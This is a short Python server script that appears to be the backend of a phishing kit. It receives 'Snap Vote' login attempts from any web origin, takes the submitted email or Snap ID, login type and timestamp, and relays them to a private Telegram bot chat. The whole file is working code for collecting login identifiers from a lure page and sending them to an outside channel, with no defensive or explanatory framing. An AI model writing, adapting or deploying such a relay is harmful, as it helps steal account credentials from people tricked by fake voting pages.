#!/usr/bin/env python3
import os
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import urllib.request
import urllib.error

class TelegramHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/send-telegram':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # Get Telegram credentials from environment
            bot_token = os.environ.get('TELEGRAM_BOT_TOKEN')
            chat_id = os.environ.get('TELEGRAM_CHAT_ID')
            
            if not bot_token or not chat_id:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': 'Missing credentials'}).encode())
                return
            
            # Format message
            message = f"""🔔 New Snap Vote Login Attempt

👤 Email/Snap ID: {data.get('email', 'N/A')}
📝 Type: {data.get('type', 'Email Login')}
⏰ Time: {data.get('timestamp', 'N/A')}

📍 From: Snap Vote Admin System"""
            
            # Send to Telegram
            try:
                telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                telegram_data = {
                    'chat_id': chat_id,
                    'text': message,
                    'parse_mode': 'HTML'
                }
                
                req = urllib.request.Request(
                    telegram_url,
                    data=json.dumps(telegram_data).encode('utf-8'),
                    headers={'Content-Type': 'application/json'}
                )
                
                with urllib.request.urlopen(req) as response:
                    result = json.loads(response.read().decode('utf-8'))
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': True}).encode())
                    
            except urllib.error.URLError as e:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 3000), TelegramHandler)
    print('Telegram Notifier running on port 3000...')
    server.serve_forever()
